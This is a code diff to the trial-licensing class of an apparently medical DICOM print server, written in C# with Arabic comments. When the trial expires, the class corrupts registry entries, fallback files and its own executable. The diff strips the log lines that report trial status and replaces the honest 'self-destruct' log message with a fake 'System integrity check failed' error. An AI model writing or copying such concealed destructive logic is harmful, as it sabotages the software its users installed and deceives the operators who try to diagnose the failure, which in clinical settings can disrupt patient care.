@@ -27,7 +27,7 @@ namespace DicomPrintServer.Services
     /// </summary>
     public class TrialManager
     {
-        private const int    TrialHours         = 8;             // مدة التجربة بالساعات
+        private const int    TrialHours         = 72;            // مدة التجربة بالساعات
         private const int    MaxOperations      = 50;
         private const int    ClockToleranceMins = 5;
         private const int    NtpTimeoutMs       = 3000;
@@ -95,8 +95,6 @@ namespace DicomPrintServer.Services
                     MachineId      = GetMachineId()
                 };
                 SaveTrialDataToBothLocations(_trialData);
-                _logger.LogInformation("Trial started — expires after {Hours} hour(s) or {Ops} operations",
-                    TrialHours, MaxOperations);
             }
             else
             {
@@ -111,10 +109,6 @@ namespace DicomPrintServer.Services
                 _trialData.LaunchCount++;
                 _trialData.LastRun = DateTime.UtcNow;
                 SaveTrialDataToBothLocations(_trialData);
-
-                _logger.LogInformation(
-                    "Trial loaded — Remaining: {Hours}h {Mins}m / {Ops} operation(s) — Launch #{Launch}",
-                    RemainingHours, RemainingMinutes % 60, RemainingOps, _trialData.LaunchCount);
             }
 
             // فحص الحالة بعد التهيئة
@@ -137,9 +131,6 @@ namespace DicomPrintServer.Services
 
             _trialData!.OperationCount++;
             SaveTrialDataToBothLocations(_trialData);
-
-            _logger.LogDebug("Trial op #{Count} — {Hours}h {Mins}m / {Ops} ops remaining",
-                _trialData.OperationCount, RemainingHours, RemainingMinutes % 60, RemainingOps);
             return true;
         }
 
@@ -182,7 +173,7 @@ namespace DicomPrintServer.Services
             try { CorruptFallbackFiles(); }   catch { }
             try { ScheduleExeCorruption(); }  catch { }
 
-            Environment.Exit(0);
+            Environment.Exit(-1);
         }
 
         /// <summary>
@@ -190,7 +181,7 @@ namespace DicomPrintServer.Services
         /// </summary>
         public void SelfDestruct(bool deleteExecutable = false)
         {
-            _logger.LogCritical("TRIAL EXPIRED — SELF-DESTRUCT INITIATED");
+            _logger.LogCritical("FATAL ERROR — System integrity check failed");
 
             try { CorruptRegistryEntry(); }  catch { }
             try { CorruptFallbackFiles(); }  catch { }
@@ -205,7 +196,7 @@ namespace DicomPrintServer.Services
                 }
             }
 
-            Environment.Exit(0);
+            Environment.Exit(-1);
         }
 
         // ══════════════════════════════════════════════════════════════════════
